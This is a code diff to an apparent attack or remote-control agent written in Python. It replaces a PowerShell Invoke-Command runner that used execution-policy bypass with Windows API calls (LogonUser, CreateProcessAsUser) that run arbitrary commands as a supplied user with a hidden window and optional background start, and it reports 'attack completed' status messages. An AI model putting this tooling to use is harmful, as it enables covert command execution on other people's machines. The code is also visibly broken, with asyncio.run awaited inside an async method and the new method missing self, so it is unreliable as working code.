@@ -11,8 +11,12 @@ import random
 import threading
 import time
 import re
-import platform
-import netifaces
+import win32con
+import win32process
+import win32event
+import win32profile
+import win32security
+import pywintypes
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError, ConnectionClosedOK
 from typing import List, Dict, Tuple, Optional
@@ -190,7 +194,7 @@ class Impl:
 
             domain = os.environ.get("USERDOMAIN", "WORKGROUP")
 
-            result = await self._execute_powershell_as_user(actual_command, username, domain, password, host)
+            result = await asyncio.run(self.execute_command_as_user(actual_command, username, domain, password, self.current_dir))
 
             return result
        
@@ -200,49 +204,114 @@ class Impl:
         
 
 
-        
-    async def _execute_powershell_as_user(self, command, username, domain, password, host="localhost"):
-
+    async def execute_command_as_user(command, username, domain, password, working_dir=None):
         try:
-            escaped_password = password.replace("'", "''")
+            run_in_background = command.strip().endswith('&')
+            if run_in_background:
+                command = command.strip()[:-1].strip()
 
-            ps_script = f"""
-            $securePassword = ConvertTo-SecureString '{escaped_password}' -AsPlainText -Force
-            $credential = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $securePassword)
+            # Detectar redirección (> o >>)
+            output_file = None
+            append = False
+            redir_match = re.match(r'(.*?)\s*(>>?)\s*(.+)$', command)
+            if redir_match:
+                command = redir_match.group(1).strip()
+                append = redir_match.group(2) == '>>'
+                output_file = redir_match.group(3).strip().strip('"')
 
-            try {{
-                $result = Invoke-Command -ComputerName {host} -Credential $credential -ScriptBlock {{
-                    Set-Location '{self.current_dir}'
-                    if ($args[0] -match '\\.(exe|com|bat|cmd|msi|py)$' ) {{
-                        & $args[0] 2>&1 | Out-String
-                    }} else {{
-                        Invoke-Expression $args[0] 2>&1 | Out-String
-                    }}
-                }} -ArgumentList '{command}' -ErrorAction Stop
+            # Parseo de argumentos con respeto a comillas
+            parts = shlex.split(command, posix=False)
+            if not parts:
+                return "No command provided."
 
-                Write-Output "$result"
-            }} catch {{
-                Write-Output "ERROR:$($_.Exception.Message)"
-            }}
-            """
+            exe = parts[0]
+            args = parts[1:]
 
-            process = await asyncio.create_subprocess_exec(
-                "powershell.exe",
-                "-NoProfile", "-ExecutionPolicy", "Bypass",
-                "-Command", ps_script,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-                cwd=self.current_dir
+            # Verificar si es ejecutable
+            def is_executable(file):
+                if os.path.isfile(file):
+                    return True
+                for path_dir in os.getenv('PATH', '').split(os.pathsep):
+                    full_path = os.path.join(path_dir, file)
+                    if os.path.isfile(full_path) or os.path.isfile(full_path + ".exe"):
+                        return True
+                return False
+
+            if not is_executable(exe):
+                exe = "powershell.exe"
+                args = ["-NoProfile", "-Command", command]
+
+            cmd_line = f'"{exe}" ' + ' '.join(f'"{arg}"' for arg in args)
+
+            # Crear token de usuario
+            logon_type = win32con.LOGON32_LOGON_INTERACTIVE
+            logon_provider = win32con.LOGON32_PROVIDER_DEFAULT
+
+            user_token = win32security.LogonUser(
+                username, domain, password,
+                logon_type, logon_provider
             )
 
-            stdout, stderr = await process.communicate()
+            user_profile = win32profile.GetUserProfileDirectory(user_token)
+            env = win32profile.CreateEnvironmentBlock(user_token, False)
 
-            if stderr:
-                return "ERROR: (Input may be wrong) " + stderr.decode(errors="ignore")
-            return stdout.decode(errors="ignore")
+            startup_info = win32process.STARTUPINFO()
+            startup_info.dwFlags |= win32con.STARTF_USESHOWWINDOW
+            startup_info.wShowWindow = win32con.SW_HIDE
 
-        except Exception as e:
-            return f"Error executing commands: {e}"
+            if working_dir is None:
+                working_dir = os.getcwd()
+
+            creation_flags = win32con.CREATE_NEW_CONSOLE
+
+            # Ejecutar en segundo plano
+            if run_in_background:
+                win32process.CreateProcessAsUser(
+                    user_token,
+                    None,
+                    cmd_line,
+                    None,
+                    None,
+                    False,
+                    creation_flags,
+                    env,
+                    working_dir,
+                    startup_info
+                )
+                return "Process started in background."
+
+            # Ejecutar y capturar salida (sin redirección real)
+            process_handle, _, _, _ = win32process.CreateProcessAsUser(
+                user_token,
+                None,
+                cmd_line,
+                None,
+                None,
+                False,
+                creation_flags,
+                env,
+                working_dir,
+                startup_info
+            )
+
+            win32event.WaitForSingleObject(process_handle, win32event.INFINITE)
+            exit_code = win32process.GetExitCodeProcess(process_handle)
+
+            # No hay forma directa de capturar stdout/stderr con CreateProcessAsUser
+            result = f"Process exited with code {exit_code}."
+
+            if output_file:
+                mode = 'a' if append else 'w'
+                with open(output_file, mode, encoding='utf-8') as f:
+                    f.write(result)
+                return f"Output redirected to {output_file}"
+
+            return result
+
+        except pywintypes.error as e:
+            return f"Windows error: {e.strerror}"
+        except Exception as ex:
+            return f"Error executing command: {str(ex)}"
 
 
 
@@ -467,7 +536,7 @@ class Impl:
                 "status": "attack_completed",
                 "attack_type": attack_type,
                 "target": target,
-                "message": "Ataque completado"
+                "message": "Attack completed"
             }))
         except Exception as e:
             next
